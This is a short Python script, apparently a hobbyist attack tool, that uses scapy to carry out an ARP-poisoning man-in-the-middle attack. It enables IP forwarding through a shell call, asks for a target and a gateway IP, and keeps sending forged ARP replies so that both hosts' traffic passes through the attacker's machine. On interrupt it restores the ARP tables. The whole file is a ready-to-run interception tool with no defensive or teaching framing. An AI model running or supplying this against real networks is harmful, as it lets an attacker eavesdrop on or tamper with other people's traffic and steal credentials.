import scapy.all as scapy
import subprocess as sub
import time

sub.call("echo 1 > /proc/sys/net/ipv4/ip_forward",shell=True)
time.sleep(1)

def targetIp():
    target_ip=input("Enter Target Ip: ")
    if target_ip == "":
        print("Enter Target Ip...")
    return target_ip
def gatewayIp():
    gateway_ip=input("Enter Gateway Ip: ")
    if gateway_ip =="":
        print("Enter Gateway Ip...")
    return gateway_ip

def get_mac(ip):

    arp_request=scapy.ARP(pdst=ip)
    broadcast_request=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_request=broadcast_request/arp_request
    answered_list=scapy.srp((combined_request),timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip,poisoned_ip):
    target_mac=get_mac(target_ip)
    arp_response=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)

def delete_poisoning(fooled_ip,gateway_ip):
    fooled_mac=get_mac(fooled_ip)
    gateway_mac=get_mac(gateway_ip)
    arp_response=scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=5)

target_ip=targetIp()
gateway_ip=gatewayIp()

num=0
try:
    while True:
        num+=2
        arp_poisoning(target_ip,gateway_ip)
        arp_poisoning(gateway_ip,target_ip)
        time.sleep(1)
        print("\rSending packets..."+num,end="")
except KeyboardInterrupt:
    print("\nMITM Attack Stoped and Resseted")
    delete_poisoning(target_ip,gateway_ip)
    delete_poisoning(gateway_ip,target_ip)
